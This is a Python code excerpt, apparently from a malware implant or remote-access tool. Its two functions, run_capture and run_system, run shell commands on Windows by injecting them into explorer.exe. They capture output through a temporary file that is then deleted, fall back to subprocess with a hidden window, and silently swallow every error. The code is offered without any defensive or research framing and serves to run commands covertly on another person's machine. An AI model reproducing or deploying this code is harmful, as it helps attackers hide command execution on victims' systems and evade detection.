def run_capture(cmd, timeout=30):
    """Execute command via injection, capture output via temp file.
    Falls back to subprocess.check_output on failure."""
    if os.name != 'nt':
        try:
            return subprocess.check_output(cmd, shell=True, stderr=subprocess.DEVNULL, timeout=timeout).decode()
        except:
            return ''
    tmp = os.path.join(os.environ.get('TEMP', 'C:\\Windows\\Temp'),
                       f'_{uuid.uuid4().hex}.tmp')
    injected = f'{cmd} > "{tmp}" 2>&1'
    if inject_into_explorer(injected, timeout) == 0:
        time.sleep(0.5)
        try:
            with open(tmp, 'rb') as f:
                data = f.read()
            os.unlink(tmp)
            return data.decode('utf-8', errors='replace')
        except:
            return ''
    try:
        os.unlink(tmp)
    except:
        pass
    try:
        return subprocess.check_output(cmd, shell=True, stderr=subprocess.DEVNULL, timeout=timeout).decode()
    except:
        return ''
def run_system(cmd, timeout=30):
    """Execute system command. Tries injection into explorer.exe;
    falls back to subprocess if injection fails."""
    if inject_into_explorer(cmd, timeout) == 0:
        return 0
    try:
        si = subprocess.STARTUPINFO()
        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        si.wShowWindow = subprocess.SW_HIDE
        return subprocess.call(cmd, shell=True, startupinfo=si,
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                               timeout=timeout)
    except:
        return -1
